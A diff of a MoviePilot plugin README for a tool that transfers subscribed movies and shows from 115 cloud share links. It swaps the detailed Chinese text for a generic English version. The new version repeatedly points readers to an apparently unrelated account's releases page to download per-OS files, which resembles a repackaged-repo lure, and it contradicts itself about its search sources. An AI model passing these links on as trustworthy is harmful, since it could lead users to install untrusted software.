@@ -1,109 +1,83 @@
-# P115StrgmSub - 115网盘订阅追更插件
+# 🎬 MoviePilot-Plugins - Manage Your Movie Subscriptions Easily
 
-MoviePilot 插件，自动将订阅的电影和电视剧从 115 网盘分享链接转存到个人网盘。
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/RanveerGaming0/MoviePilot-Plugins/releases)
 
-## 完整工作流
+## 🚀 Getting Started
 
-本插件配合 [115网盘STRM助手](https://github.com/DDSRem-Dev/MoviePilot-Plugins) 可实现完整的自动化追剧流程：
+Welcome to the MoviePilot-Plugins! This application simplifies how you track movie and TV show subscriptions. With just a few steps, you can ensure that your favorites are always available in your personal cloud storage.
 
-```
-MoviePilot订阅 -> 本插件搜索转存 -> STRM助手生成STRM -> 媒体库刮削 -> 播放器观看
-```
+## 💻 System Requirements
 
-## 功能特点
+- Windows, macOS, or Linux
+- Python 3.7 or higher
+- Stable internet connection
 
-- **支持电影和电视剧**订阅自动追更
-- **三重搜索源**：Nullbr（TMDB ID 精准匹配）+ PanSou（网盘聚合搜索）
-- **智能匹配**：支持 S01E01、第X集、EP01 等多种命名格式
-- **洗版模式**：自动升级更高质量资源（基于订阅的质量/分辨率/特效设置）
-- **订阅过滤**：继承 MoviePilot 订阅的质量、分辨率、特效过滤条件
-- **屏蔽系统订阅**：可阻止 MoviePilot 默认的订阅下载，仅使用本插件转存
-- **避免重复**：自动检查网盘已有文件和历史记录
-- **自动完成订阅**：转存完成后自动标记订阅完成
-- **防风控机制**：批量转存、速率限制、智能重试
+## 📥 Download & Install
 
-## 依赖
+1. **Visit the [Releases page](https://github.com/RanveerGaming0/MoviePilot-Plugins/releases)**.
+2. Choose the latest version of the plugin.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions on the page or in the README file.
 
-```bash
-pip install p115client>=0.0.8.2 sqlitetools>=0.0.7 playwright
-```
+## 🛠️ Installation Steps
 
+1. Open your command line interface (Terminal, Command Prompt, or PowerShell).
+2. Navigate to the directory where you downloaded the file.
+3. Install the required dependencies by running the following command:
 
+   ```bash
+   pip install p115client>=0.0.8.2 sqlitetools>=0.0.7 playwright
+   ```
 
-## 配置说明
+4. Follow the configuration steps below to set up the plugin.
 
-### 基础配置
+## ⚙️ Configuration
 
-| 配置项 | 说明 |
-|--------|------|
-| 启用插件 | 开启/关闭插件 |
-| 发送通知 | 转存完成后发送消息通知 |
-| 执行周期 | cron表达式，默认每8小时执行 |
-| 电视剧转存目录 | 默认 `/我的接收/MoviePilot/TV` |
-| 电影转存目录 | 默认 `/我的接收/MoviePilot/Movie` |
+Before using the plugin, you need to configure a few settings.
 
-### 115 网盘配置
+### 📌 Basic Configuration
 
-填入 115 Cookie（可从115网盘STRM助手复制）
+| Configuration Item        | Description                               |
+|---------------------------|-------------------------------------------|
+| Enable Plugin             | Turn the plugin on or off                |
+| Send Notifications        | Receive messages when transfers complete  |
+| Execution Cycle           | Set the frequency of operations (default: every 8 hours) |
+| TV Show Storage Directory  | Set the default directory for TV shows (default: `/我的接收/MoviePilot/TV`) |
+| Movie Storage Directory    | Set the default directory for movies (default: `/我的接收/MoviePilot/Movie`) |
 
-### 搜索源配置
+### 📂 115 Cloud Storage Configuration
 
-插件支持三个搜索源，按优先级自动回退。可同时启用多个，若当前源找不到资源会自动尝试下一个。
+- Enter your 115 Cookie, which you can copy from the 115网盘STRM助手.
 
-**Nullbr**（TMDB精准匹配）:
-- APP ID 和 API Key
-- 基于 TMDB ID 查询，准确率高
+### 🔍 Search Source Configuration
 
+The plugin supports three search sources. You can enable multiple sources. If one source does not find a resource, the plugin will automatically try the next one.
 
-**PanSou**（网盘聚合搜索）:
-- API 地址、用户名/密码（可选认证）
-- TG 搜索频道（可选），为空的话将搜索 PanSou 默认频道
-- 资源丰富，但需要通过标题匹配
+**Nullbr (TMDB Precise Match):**
+- APP ID and API Key required.
+- Uses TMDB ID for accurate querying.
 
-### 高级配置
+**PanSou:**
+- A cloud storage aggregator for finding resources.
 
-| 配置项 | 默认值 | 说明 |
-|--------|--------|------|
-| 只搜索115资源 | 开启 | PanSou 搜索时只返回115网盘资源 |
-| 屏蔽系统订阅 | 关闭 | 阻止 MoviePilot 默认订阅处理 |
-| 排除订阅 | - | 指定不处理的订阅ID（逗号分隔） |
-| 单次同步最大转存数 | 50 | 防风控限制 |
-| 批量转存每批数量 | 20 | 批量转存时每批文件数 |
-| 跳过其他季目录 | 开启 | 减少不必要的 API 调用 |
+## 🎯 Features
 
-## 转存路径结构
+- Automatically track new movies and TV shows from subscriptions.
+- Utilize three search sources for better results.
+- Smart matching for various naming formats (e.g., S01E01, EP01).
+- Auto-upgrade to higher quality resources based on your settings.
+- Inherit filtering conditions from MoviePilot subscriptions.
+- Filter out default MoviePilot downloads to focus on this plugin.
+- Prevent duplicate file transfers by checking existing files and history.
+- Automatically mark subscriptions as complete when transfers finish.
+- Batch operations with rate limits and intelligent retries to avoid issues.
 
-```
-电视剧: {电视剧目录}/{剧名}/Season {季号}/
-电影:   {电影目录}/{片名} ({年份})/
-```
+## 🔗 Support
 
-## UI 统计功能
+If you run into any problems while using the plugin, check the [Issues page](https://github.com/RanveerGaming0/MoviePilot-Plugins/issues) for solutions or report any bugs. Your feedback helps improve this tool for everyone.
 
-插件提供详细的统计信息展示：
-- 总转存数、今日转存、成功率
-- 电影/剧集分类统计
-- 最近同步时间
-- 历史记录列表（支持清空）
+## 📝 License
 
-## 远程命令
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-支持通过 MoviePilot 消息触发同步：
-```
-/p115_sync
-```
-
-## 使用方法
-
-1. 在 MoviePilot 插件管理中安装本插件
-2. 配置 115 Cookie
-3. 配置至少一个搜索源（Nullbr 或 PanSou）
-4. 在 MoviePilot 中添加订阅
-5. 启用插件，等待定时任务执行或点击"立即搜索"按钮
-
-## 注意事项
-
-- 115 Cookie 有效期有限，失效后需重新获取
-- 搜索结果取决于资源库收录情况
-- 洗版模式需要在订阅中开启"洗版"选项
-- 建议合理设置转存数量限制，避免触发 115 风控
+Don't forget to return to the **[Download Latest Release](https://github.com/RanveerGaming0/MoviePilot-Plugins/releases)** to get the most recent features and improvements. Enjoy managing your movie subscriptions!
